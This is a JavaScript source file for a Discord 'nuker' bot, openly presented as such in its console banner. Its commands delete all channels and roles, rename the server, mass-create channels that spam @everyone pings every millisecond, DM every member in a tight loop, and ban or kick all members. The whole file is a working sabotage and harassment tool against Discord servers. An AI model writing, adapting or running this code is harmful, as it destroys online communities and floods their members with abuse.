/*
*
* @hiroshi
* 11.01.2022
*
*/

const { rejects } = require("assert");
const Discord = require("discord.js")
const fs = require("fs");
const { connect } = require("http2");
const { resolve } = require("path");
const readline = require('readline').createInterface({input: process.stdin, output: process.stdout})
FgMagenta = "\x1b[35m"
FgWhite = "\x1b[37m"
FgBlue = "\x1b[34m"
let prefix = "$"
let client = new Discord.Client({
    intents:[
        "GUILDS",
        "GUILD_MESSAGES"
    ]
})
client.config = JSON.parse(fs.readFileSync("config.json", "utf-8"));

client.on('ready', ()=>{
    console.clear();
    console.log(`${FgMagenta}
			██╗░░██╗██╗██████╗░░█████╗░░██████╗██╗░░██╗██╗
			██║░░██║██║██╔══██╗██╔══██╗██╔════╝██║░░██║██║
			███████║██║██████╔╝██║░░██║╚█████╗░███████║██║
			██╔══██║██║██╔══██╗██║░░██║░╚═══██╗██╔══██║██║
			██║░░██║██║██║░░██║╚█████╔╝██████╔╝██║░░██║██║
			╚═╝░░╚═╝╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚═╝
    
					${FgMagenta}Nuker:${FgBlue}${client.user.tag}${FgMagenta}
					${FgMagenta}Prefix: ${FgBlue}${prefix}${FgMagenta}
					${FgMagenta}Token:
                    ${FgWhite}${client.config.token}${FgMagenta}

					Commands:${FgWhite}
			${prefix}nuke: Deletes all Channels and Displays your channel Names
			${prefix}delete: Deletes all Channels
    `)
    console.log(' ')
    client.user.setActivity({name: `${client.user.username}`, type: "COMPETING"});
    if(client.config.avatarURL !== ""){
        client.user.setAvatar(client.config.avatarURL)
    }
    if(client.config.botName !== ""){
        client.user.setUsername(client.config.botName);
    }
})


client.on('messageCreate', (message) =>{
    
    /*Permissions*/
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const guildPerms = message.guild.me.permissions.has("MANAGE_GUILD" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");    
    /**/

    if(message.content === prefix + "nuke"){
        console.log("Start nuking...")
        DelAllChannels();
        nuke();
        serverName();
		messageAll();
        delAllRoles();
    } else if(message.content === prefix + "banAll"){
        BanAll();
    } else if(message.content === prefix + "kickAll"){
        KickAll();
    } else if(message.content === prefix + "delete"){
        DelAllChannels();
    } else if(message.content === prefix + "test"){
        serverAvatar();
    }

    /*Functions*/
    function DelAllChannels(){
        return new Promise((resolve, reject) => {
            if(!channelPerms) return reject("Bot Missing Permission: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => {console.log("Error: " + err)}))
            resolve();
        })
    }

    function messageAll(){
        let text = client.config.dmMessage;
        message.guild.members.cache.forEach(member => {
            if(!member.user.bot){
                setInterval(() => {
                    if(!text){
                        member.send("@here").catch((err) => console.log(err))
                    } else {
                        member.send("@here " + text).catch((err) => console.log(err))
                    }
                }, 1)
            }
        })
    }

    function serverName(){
        if(!guildPerms) return;
        return new Promise((resolve, reject) => {
            message.guild.setName(client.config.newServerName);
            console.log(`New Server-Name: ${client.config.newServerName}!`)
        })
    }

    function BanAll(){
        return new Promise((resolve, reject) => {
            if(!banPerms) return reject("Bot Missing Permission: 'BAN_MEMBERS'");
            return new Promise((resolve, reject) => {
                if(!channelPerms) return reject("Bot Missing Permission: 'BAN_MEMBERS'");
                let idArray = message.guild.members.cache.map((user) => user.id);
                message.reply("Found and banning " + idArray.length + " users!").then((msg) => {
                    setTimeout(() => {
                        msg.edit("Banning the losers...");
                        for(let i = 0; i < idArray.length; i++){
                            const user = idArray[i];
                            const member = message.guild.members.cache.get(user);   
                            if(member.bannable){
                                member.ban().catch((err) => {console.log("Error: " + err)}).then(() => { console.log(`${FgMagenta}[${FgWhite}+${FgMagenta}]${FgMagenta}${member.user.id} ${FgWhite}was banned.`) });
                            } else {
                                console.log("No Permissions");
                            }
                        }
                    }, 1000)
                })
                resolve();
            })
        })
    }

    function KickAll(){
        return new Promise((resolve, reject) => {
            if(!kickPerms) return reject("Bot Missing Permission: 'BAN_USER'");
            return new Promise((resolve, reject) => {
                if(!channelPerms) return reject("Bot Missing Permission: 'BAN_MEMBERS'");
                let idArray = message.guild.members.cache.map((user) => user.id);
                message.reply("Found and kicking " + idArray.length + " users!").then((msg) => {
                    setTimeout(() => {
                        msg.edit("Kicking the losers...");
                        for(let i = 0; i < idArray.length; i++){
                            const user = idArray[i];
                            const member = message.guild.members.cache.get(user);   
                            member.kick().catch((err) => {console.log("Error: " + err)}).then(() => { console.log(`${FgMagenta}[${FgWhite}+${FgMagenta}]${FgMagenta}${member.user.id} ${FgWhite}was kicked.`) });
                        }
                    }, 2000)
                })
            })
        })
    }

    function delAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log("Error Found: " + err) }))
        })
    }

    function nuke(){
        return new Promise((resolve, reject) => {
            var amount = client.config.channelAmount;
            var channelName = client.config.channelName;
            if(!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            if(!channelName){
                for(let i = 0; i < amount; i++){
                    if (message.guild.channels.cache.size === 500) break;
                    message.guild.channels.create(`${message.author.username} was here`, {type: "GUILD_TEXT"}).catch((err) => console.log("Error: " + err)).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone" + client.config.pingMessage);
                        }, 1);
                    });
                }
            } else {
                for(let i = 0; i < amount; i++){
                    if (message.guild.channels.cache.size === 500) break;
                    message.guild.channels.create(`${channelName}`, {type: "GUILD_TEXT"}).catch((err) => console.log("Error: " + err)).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone" + client.config.pingMessage);
                        }, 1);
                    });
                }
            }
        })
    }

    function serverAvatar() {
        return new Promise((resolve, rejects) => {
            var avatar = client.user.avatarURL();
            message.guild.setIcon(avatar);
        })
    }

})

client.login(client.config.token);
